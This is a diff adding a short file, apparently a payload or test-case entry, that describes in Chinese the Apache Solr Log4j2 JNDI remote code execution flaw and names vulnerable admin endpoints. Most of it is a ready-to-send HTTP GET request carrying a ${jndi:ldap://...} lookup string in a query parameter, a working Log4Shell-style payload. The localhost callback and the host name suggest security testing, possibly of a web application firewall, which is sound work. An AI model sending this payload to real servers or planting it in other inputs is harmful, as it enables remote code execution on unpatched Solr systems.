@@ -1,0 +1,9 @@
+# Apache Solr log4j2远程代码执行
+# ApacheLog4j2是一个开源的 Java 日志记录工具。Log4j2 是 Log4j 的升级版本,其优异的性能被广泛的应用于各种常见的 Web 服务中。 Log4j2 在特定的版本中由于启用了 lookup 功能,导致存在JNDI漏洞。Solr引用了log4j2组件也存在同样的注入漏洞，如"/solr/admin/info"，“solr/admin/cores”等均存在该漏洞，可通过控制任意参数进行Log4j2的利用。
+GET /solr/admin/info?acid=80002149&id=$%7Bjndi:ldap:%2F%2F127.0.0.1:888%7D&bid=hd_tag_m8mv257q HTTP/1.1
+Host: www.swaf.com
+RM-PRO-BusinessID: hd_tag_m8mv257q
+RM-PRO-Token: fa1a642e8052fac6591f64d981ac5e44
+RM-PRO-Time: 1742808448384
+User-Agent: curl/7.83.1
+
